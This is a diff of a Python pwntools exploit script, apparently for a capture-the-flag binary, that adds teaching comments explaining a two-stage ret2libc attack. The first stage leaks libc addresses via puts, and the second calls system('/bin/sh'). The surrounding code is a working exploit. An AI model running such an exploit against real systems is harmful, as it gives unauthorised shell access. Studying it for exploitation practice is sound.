@@ -73,17 +73,37 @@ payload+=p64(puts_plt)
 ########### Re-call main so we can trigger the vulnerability again #######
 payload+=p64(maincall)
 
-
 logger(payload+"\n") # Logging the first stage of the exploit
 
+
+# At this point our payload looks like:
+# AAAAAAAAAA + (ADDR_pop + addr_puts_offset + call puts) + (ADDR_pop + addr_flush_offset + call puts) + (call main)
+# if this was a program it would look something like
+# print("AAAAAAAAA");
+# put(put_address);
+# put(flush_address);
+
+# Keep in mind that is only to help you understand and is not exactly what is going on
 
 r.recvuntil('dah?') # Receive until input required
 r.sendline(payload) # Send our payload
 r.recvline() # Its gonna print out \n 
-puts_leak = r.recvline().strip('\n')[::-1] # Receive printed puts address, remove \n and reverse it
 
+puts_leak = r.recvline().strip('\n')[::-1] # Receive printed puts address, remove \n and reverse it
+                                           # We receive this because we called (Addr_pop + addr_puts_offset + call puts)
 flush_leak = r.recvline().strip('\n')[::-1]
 base_lib = (int(enhex(puts_leak),16)-libc.symbols['puts'])
+
+'''
+The address of puts that we get is going to be something like 0x7fffff65290 the libc
+we determined we are using will tell us that puts is something like...0x290 from the
+start of libc. If we take 0x7fffff65290 - 0x290 that tells us that *for this run* the
+start of libc is at 0x7fffff65000...we can use this + libc to find things we want
+...like a call to system
+
+For example...libc says system is 0x4d0 from the start....now we can use
+(0x7fffff65000 + 0x4d0) and that will be system
+'''
 
 log.info("Flush: 0x" + enhex(flush_leak))
 log.info("Puts: 0x" + enhex(puts_leak))
@@ -108,6 +128,14 @@ payload+=p64(0)  # Just want a nice clean exit(0) when we leave the shell
 payload+=p64(base_lib+libc.symbols['exit'])
 
 logger(payload) # Keep the second part of our payload for future use
+
+# now if this was a program it would look like
+# print("AAAAAA");
+# system("/bin/sh");
+# exit(0);
+
+# since we're calling /bin/sh and that blocks, exit(0) won't happen
+# until we exit out of our shell
 
 r.recvuntil('dah?')
 r.sendline(payload) # Send it and let interactive() handling the printing
